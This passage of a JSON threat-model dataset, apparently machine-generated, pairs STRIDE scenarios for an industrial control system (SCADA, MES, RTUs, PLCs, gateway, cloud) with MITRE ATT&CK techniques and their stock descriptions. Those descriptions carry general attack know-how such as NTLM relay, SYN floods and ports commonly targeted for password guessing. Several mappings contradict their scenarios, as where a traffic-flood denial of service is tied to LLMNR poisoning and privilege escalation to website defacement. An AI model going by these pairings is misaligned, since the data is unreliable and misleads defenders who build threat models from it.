                    "Condition": "Inadequate access control policies."
                },
                {
                    "Assumption": "Multiple users have shared credentials.",
                    "Role": "Organizational Policy Maker",
                    "Condition": "Poor credential management."
                }
            ],
            "Potential Impact": "Conflicts in critical data entries can result in incorrect business decisions and financial implications.",
            "MITRE ATT&CK Keywords": [
                "Repudiation",
                "ERP",
                "Data Entries",
                "Responsibility Denial"
            ],
            "mitre_technique": {
                "name": "JavaScript",
                "description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",
                "id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
                "technique_id": "T1059.007"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to sensitive operational data from the MES database.",
            "Assumptions": [
                {
                    "Assumption": "The database is accessible without stringent access controls.",
                    "Role": "Database Administrator",
                    "Condition": "Weak access control policies for databases."
                },
                {
                    "Assumption": "The attacker has insider access or exploits a vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Insider threat or known vulnerability."
                },
                {
                    "Assumption": "Data in the MES database is not encrypted.",
                    "Role": "System Architect",
                    "Condition": "Lack of encryption for sensitive data at rest."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive operational data can jeopardize competitive advantage and operational security.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "MES",
                "Database",
                "Operational Data"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data is exposed during transmission between field devices and the SCADA system due to unsecured communication channels.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels lack encryption.",
                    "Role": "System Architect",
                    "Condition": "Use of unencrypted communication protocols."
                },
                {
                    "Assumption": "Attacker has means to intercept data in transit.",
                    "Role": "Attacker",
                    "Condition": "Network access or proximity."
                },
                {
                    "Assumption": "No end-to-end encryption is enforced in SCADA communications.",
                    "Role": "System Designer",
                    "Condition": "Lack of enforcement of encryption policies."
                }
            ],
            "Potential Impact": "Sensitive data could be exposed leading to industrial espionage or operational sabotage.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Data Transmission",
                "SCADA",
                "Field Devices"
            ],
            "mitre_technique": {
                "name": "System Binary Proxy Execution",
                "description": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system. (Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands. Similarly, on Linux systems adversaries may abuse trusted binaries such as split to proxy execution of malicious commands. (Citation: split man page)(Citation: GTFO split)\n\nAdversaries may abuse application binaries installed on a system for proxy execution of malicious code or domain-specific commands. These commands could be used to target local resources on the device or networked devices within the environment through defined APIs ([Execution through API](https://attack.mitre.org/techniques/T0871)) or application-specific programming languages (e.g., MicroSCADA SCIL). Application binaries may be signed by the developer or generally trusted by the operators, analysts, and monitoring tools accustomed to the environment. These applications may be developed and/or directly provided by the device vendor to enable configuration, management, and operation of their devices without many alternatives. \n\nAdversaries may seek to target these trusted application binaries to execute or send commands without the development of custom malware. For example, adversaries may target a SCADA server binary which has the existing ability to send commands to substation devices, such as through IEC 104 command messages. Proxy execution may still require the development of custom tools to hook into the application binary\u2019s execution.\n\n",
                "id": "attack-pattern--1c5cf58c-a34a-40d7-82f4-f987cdfc2b91",
                "technique_id": "T0894"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized cloud access and retrieves stored sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud access controls are weak or misconfigured.",
                    "Role": "Cloud Administrator",
                    "Condition": "Misconfiguration or insufficient security policies."
                },
                {
                    "Assumption": "The attacker finds and exploits misconfigured cloud resources.",
                    "Role": "Attacker",
                    "Condition": "Discovery and exploitation of cloud security gaps."
                },
                {
                    "Assumption": "Data stored in the cloud is not properly encrypted.",
                    "Role": "System Architect",
                    "Condition": "Unencrypted or weakly encrypted data at rest."
                }
            ],
            "Potential Impact": "This could lead to unauthorized access to sensitive data, potential data breaches, and financial losses.",
            "MITRE ATT&CK Keywords": [
                "Information Disclosure",
                "Cloud",
                "Sensitive Data",
                "Unauthorized Access"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the control center network with traffic, causing system slowdowns or outages.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient network traffic monitoring or filtering.",
                    "Role": "Network Administrator",
                    "Condition": "Lack of advanced traffic management."
                },
                {
                    "Assumption": "Network infrastructure cannot handle excessive traffic loads.",
                    "Role": "Network Architect",
                    "Condition": "Infrastructure capacity limitations."
                },
                {
                    "Assumption": "Attack vectors for traffic flooding are not sufficiently mitigated.",
                    "Role": "Security Analyst",
                    "Condition": "Vulnerabilities in network security measures."
                }
            ],
            "Potential Impact": "Operational downtime, loss of productivity, and potential financial losses due to service interruptions.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Traffic Flooding",
                "Network",
                "Control Center"
            ],
            "mitre_technique": {
                "name": "LLMNR/NBT-NS Poisoning and Relay",
                "description": "Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
                "id": "attack-pattern--0dbf5f1b-a560-4d51-ac1b-d70caab3e1f0",
                "technique_id": "T1171"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malware infects RTUs, causing them to become unresponsive to control commands.",
            "Assumptions": [
                {
                    "Assumption": "RTUs lack sufficient cybersecurity protections.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate malware defence mechanisms."
                },
                {
                    "Assumption": "The control center cannot isolate compromised devices quickly.",
                    "Role": "Incident Response Team",
                    "Condition": "Delayed or ineffective incident response."
                },
                {
                    "Assumption": "The attacker can propagate malware to multiple RTUs.",
                    "Role": "Attacker",
                    "Condition": "Weak point of entry exploited."
                }
            ],
            "Potential Impact": "RTUs become non-functional, affecting process control and data collection, leading to production delays.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "Malware",
                "RTUs",
                "Unresponsive"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS attack targets the cloud services, making it inaccessible for data storage and analytics.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services are publicly accessible without adequate DDoS protection.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Lack of robust DDoS countermeasures."
                },
                {
                    "Assumption": "Attackers have sufficient resources to launch a large-scale DDoS attack.",
                    "Role": "Attacker",
                    "Condition": "Access to a botnet or similar."
                },
                {
                    "Assumption": "Monitoring tools are unable to detect and mitigate the attack promptly.",
                    "Role": "Cloud Administrator",
                    "Condition": "Ineffective or delayed attack detection."
                }
            ],
            "Potential Impact": "Disruption of cloud services could lead to loss of data access and analytics capabilities, hindering operational decision-making.",
            "MITRE ATT&CK Keywords": [
                "Denial of Service",
                "DDoS",
                "Cloud Services",
                "Inaccessible"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrator access to the MES through a privilege escalation exploit.",
            "Assumptions": [
                {
                    "Assumption": "The MES has vulnerabilities that allow privilege escalation.",
                    "Role": "System Developer",
                    "Condition": "Unpatched software vulnerabilities."
                },
                {
                    "Assumption": "The attacker already has access to the MES at a lower privilege level.",
                    "Role": "Attacker",
                    "Condition": "Initial level of system compromise."
                },
                {
                    "Assumption": "Access controls do not prevent or detect privilege escalation attempts.",
                    "Role": "System Administrator",
                    "Condition": "Weak access control implementations."
                }
            ],
            "Potential Impact": "Compromised MES integrity, unauthorized control over manufacturing processes, and potential data breaches.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Privilege Escalation",
                "MES",
                "Administrator Access"
            ],
            "mitre_technique": {
                "name": "External Defacement",
                "description": "An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. [External Defacement](https://attack.mitre.org/techniques/T1491/002) may ultimately cause users to distrust the systems and to question/discredit the system\u2019s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda.(Citation: FireEye Cyber Threats to Media Industries)(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)(Citation: Anonymous Hackers Deface Russian Govt Site) [External Defacement](https://attack.mitre.org/techniques/T1491/002) may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).(Citation: Trend Micro Deep Dive Into Defacement)",
                "id": "attack-pattern--0cfe31a7-81fc-472c-bc45-e2808d1066a3",
                "technique_id": "T1491.002"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the gateway to gain higher-level access to both the SCADA system and cloud services.",
            "Assumptions": [
                {
                    "Assumption": "The gateway software contains exploitable vulnerabilities.",
                    "Role": "Software Developer",
                    "Condition": "Unpatched or outdated software."
                },
                {
                    "Assumption": "The attacker has initial foothold access to the system.",
                    "Role": "Attacker",
                    "Condition": "Initial compromise through another vector."
                },
                {
                    "Assumption": "Access control mechanisms do not limit the attacker\u2019s movement between systems.",
                    "Role": "System Administrator",
                    "Condition": "Poor network segmentation and access controls."
                }
            ],
            "Potential Impact": "Compromised SCADA system and cloud service integrity, leading to potential widespread operational impacts.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Vulnerability Exploitation",
                "Gateway",
                "SCADA",
                "Cloud Services"
            ],
            "mitre_technique": {
                "name": "Web Shell",
                "description": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)\n\nIn addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)",
                "id": "attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb",
                "technique_id": "T1505.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages a misconfigured cloud storage to gain access to sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage services are misconfigured to allow broad access.",
                    "Role": "Cloud Administrator",
                    "Condition": "Misconfiguration of access policies."
                },
                {
                    "Assumption": "The attacker can exploit these misconfigurations due to insider access or knowledge.",
                    "Role": "Attacker",
                    "Condition": "Insider knowledge or advanced discovery methods."
                },
                {
                    "Assumption": "There are no monitoring tools to detect unauthorized access.",
                    "Role": "Security Team",
                    "Condition": "Lack of sufficient monitoring and alerting."
                }
            ],
            "Potential Impact": "Confidential data breaches, potential financial and reputational damage, and loss of customer trust.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Misconfiguration",
                "Cloud Storage",
                "Sensitive Data"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "11",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates an RTU to issue malicious control commands to field devices.",
            "Assumptions": [
                {
                    "Assumption": "Weak or non-existent authentication mechanisms between the Control Center and RTUs.",
                    "Role": "System Administrator",
                    "Condition": "Valid if RTUs do not have strong authentication checks in place."
                },
                {
                    "Assumption": "The attacker has network access near enough to intercept or inject commands.",
                    "Role": "Attacker",
                    "Condition": "Valid if the attacker can access the WAN or local network."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of operational data, corruption of control commands, disruption of industrial processes.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "commands",
                "control"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker pretends to be an authorized HMI user to manipulate production workflows in the MES.",
            "Assumptions": [
                {
                    "Assumption": "Inadequate user authentication on the HMI.",
                    "Role": "System Administrator",
                    "Condition": "Valid if HMI system does not use multi-factor authentication."
                },
                {
                    "Assumption": "The attacker has access credentials for the HMI interface.",
                    "Role": "Attacker",
                    "Condition": "Valid if credentials are compromised through phishing or other means."
                }
            ],
            "Potential Impact": "Manipulation of production workflows, potential production downtime and loss, unauthorized data access.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "HMI",
                "workflows",
                "credentials"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker clones a legitimate gateway device to reroute data to a malicious server.",
            "Assumptions": [
                {
                    "Assumption": "Lack of device-specific authentication on the gateway.",
                    "Role": "System Administrator",
                    "Condition": "Valid if gateways do not verify the identities of connected devices."
                },
                {
                    "Assumption": "The attacker has access to network communication lines.",
                    "Role": "Attacker",
                    "Condition": "Valid if the network is not properly secured or segmented."
                }
            ],
            "Potential Impact": "Interception and potential disclosure of sensitive data, disruption in data flow between field devices and the cloud, potential data tampering.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "gateway",
                "data interception",
                "cloud services"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
                "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.(Citation: rfc2131) The typical server-client interaction is as follows: \n\n1. The client broadcasts a `DISCOVER` message.\n\n2. The server responds with an `OFFER` message, which includes an available network address. \n\n3. The client broadcasts a `REQUEST` message, which includes the network address offered. \n\n4. The server acknowledges with an `ACK` message and the client receives the network configuration parameters.\n\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.(Citation: new_rogue_DHCP_serv_malware)(Citation: w32.tidserv.g) Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\n\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a <code>INFORMATION-REQUEST (code 11)</code> message to the <code>All_DHCP_Relay_Agents_and_Servers</code> multicast address.(Citation: rfc3315) Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\n\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002)) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool. ",
                "id": "attack-pattern--59ff91cd-1430-4075-8563-e6f15f4f9ff5",
                "technique_id": "T1557.003"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the data being sent from the field devices to the RTUs, leading to incorrect monitoring and control decisions.",
            "Assumptions": [
                {
                    "Assumption": "Weak data integrity checks on data transmitted between field devices and RTUs.",
                    "Role": "System Administrator",
                    "Condition": "Valid if communication protocols do not enforce data integrity."
                },
                {
                    "Assumption": "The attacker has access to the network infrastructure.",
                    "Role": "Attacker",
                    "Condition": "Valid if perimeter defenses are weak or bypassed."
                }
            ],
            "Potential Impact": "Corruption of operational data and potential malfunctions in industrial processes.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data modification",
                "field devices",
                "RTUs"
            ],
            "mitre_technique": {
                "name": "Alarm Suppression",
                "description": "Adversaries may target protection function alarms to prevent them from notifying operators of critical conditions. Alarm messages may be a part of an overall reporting system and of particular interest for adversaries. Disruption of the alarm system does not imply the disruption of the reporting system as a whole.\n\nA Secura presentation on targeting OT notes a dual fold goal for adversaries attempting alarm suppression: prevent outgoing alarms from being raised and prevent incoming alarms from being responded to. (Citation: Jos Wetzels, Marina Krotofil 2019) The method of suppression may greatly depend on the type of alarm in question:  \n\n* An alarm raised by a protocol message \n* An alarm signaled with I/O \n* An alarm bit set in a flag (and read) \n\nIn ICS environments, the adversary may have to suppress or contend with multiple alarms and/or alarm propagation to achieve a specific goal to evade detection or prevent intended responses from occurring. (Citation: Jos Wetzels, Marina Krotofil 2019)  Methods of suppression may involve tampering or altering device displays and logs, modifying in memory code to fixed values, or even tampering with assembly level instruction code.",
                "id": "attack-pattern--2900bbd8-308a-4274-b074-5b8bde8347bc",
                "technique_id": "T0878"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker remotely reprograms PLCs to alter the control logic of industrial processes.",
            "Assumptions": [
                {
                    "Assumption": "Weak access controls on PLC programming interfaces.",
                    "Role": "System Administrator",
                    "Condition": "Valid if PLCs are not protected by secure access mechanisms."
                },
                {
                    "Assumption": "The attacker has credentials or finds a vulnerability to bypass authentication.",
                    "Role": "Attacker",
